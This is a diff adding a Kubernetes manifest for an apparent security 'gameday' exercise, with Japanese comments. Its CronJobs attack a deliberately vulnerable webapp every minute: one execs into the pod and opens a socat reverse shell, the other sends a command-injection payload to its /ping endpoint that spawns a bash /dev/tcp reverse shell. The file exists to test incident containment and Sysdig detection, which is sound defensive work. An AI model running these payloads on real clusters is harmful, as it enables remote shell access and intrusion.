@@ -1,0 +1,132 @@
+# Wave2-a / Wave2-b: Wave1とは別系統の再攻撃(検証用、team-aでまず確認してから全チームへ展開)。
+# どちらも1分おきに継続するCronJobで、fire_wave2a.sh / fire_wave2b.sh で開始する。
+# 対応(ワークロード停止・脆弱性修正)が効くと、以降の実行結果が自然にBLOCKEDへ切り替わる。
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: attacker-wave2-runner
+  namespace: gameday
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: attacker-wave2-runner-role
+  namespace: gameday
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list"]
+  - apiGroups: [""]
+    resources: ["pods/exec"]
+    verbs: ["create"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: attacker-wave2-runner-binding
+  namespace: gameday
+subjects:
+  - kind: ServiceAccount
+    name: attacker-wave2-runner
+    namespace: gameday
+roleRef:
+  kind: Role
+  name: attacker-wave2-runner-role
+  apiGroup: rbac.authorization.k8s.io
+---
+# Wave2-a: 同じPodにexecで入り、別系統のリバースシェル(socat)を試す。
+# 「ワークロードを本当に止めた/入れ替えたか」の持続確認。RBAC修正だけでは防げない。
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: wave2a-socat-script
+  namespace: gameday
+data:
+  run.sh: |
+    #!/bin/sh
+    POD=$(kubectl get pod -n gameday -l app=vulnerable-webapp -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
+    if [ -z "$POD" ]; then
+      echo "[wave2-a] BLOCKED: vulnerable-webapp not found (workload stopped/replaced) - team has contained the incident"
+      exit 0
+    fi
+    echo "[wave2-a] target pod: $POD"
+    OUTPUT=$(kubectl exec -n gameday "$POD" -- /bin/sh -c '
+      echo "[wave2-a] shell acquired, trying socat reverse shell";
+      apt-get install -y socat >/dev/null 2>&1;
+      timeout 3 socat TCP:kubernetes.default.svc:443 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 2>/dev/null;
+      true
+    ' 2>&1)
+    echo "$OUTPUT"
+    echo "[wave2-a] SUCCEEDED: socat reverse shell attempted on live pod"
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: wave2a-socat-loop
+  namespace: gameday
+  labels:
+    gameday: wave2a
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  successfulJobsHistoryLimit: 5
+  failedJobsHistoryLimit: 5
+  jobTemplate:
+    spec:
+      backoffLimit: 0
+      template:
+        metadata:
+          labels:
+            gameday: wave2a
+        spec:
+          restartPolicy: Never
+          serviceAccountName: attacker-wave2-runner
+          containers:
+            - name: attacker
+              image: bitnami/kubectl:latest
+              command: ["/bin/sh", "/scripts/run.sh"]
+              volumeMounts:
+                - name: script
+                  mountPath: /scripts
+          volumes:
+            - name: script
+              configMap:
+                name: wave2a-socat-script
+                defaultMode: 0755
+---
+# Wave2-b: kubectl execを使わず、Service経由で本物のコマンドインジェクション(/ping?host=)を再突破。
+# RBAC修正・Pod入れ替えだけでは防げない。脆弱なイメージ/コードを直すかサービスを止めない限り通り続ける。
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: wave2b-httpinjection-loop
+  namespace: gameday
+  labels:
+    gameday: wave2b
+spec:
+  schedule: "*/1 * * * *"
+  concurrencyPolicy: Forbid
+  successfulJobsHistoryLimit: 5
+  failedJobsHistoryLimit: 5
+  jobTemplate:
+    spec:
+      backoffLimit: 0
+      template:
+        metadata:
+          labels:
+            gameday: wave2b
+        spec:
+          restartPolicy: Never
+          containers:
+            - name: attacker
+              image: curlimages/curl:latest
+              command:
+                - /bin/sh
+                - -c
+                - |
+                  echo "[wave2-b] exploiting command injection via HTTP on vulnerable-webapp Service";
+                  timeout 5 curl -s --get \
+                    --data-urlencode 'host=127.0.0.1; timeout 3 bash -c "bash -i >& /dev/tcp/kubernetes.default.svc/443 0>&1" 2>/dev/null; true' \
+                    "http://vulnerable-webapp.gameday.svc.cluster.local:8080/ping" || true;
+                  echo "[wave2-b] request sent (success/failure of the HTTP call itself doesn't matter, what matters is whether Sysdig sees the injected reverse shell)"
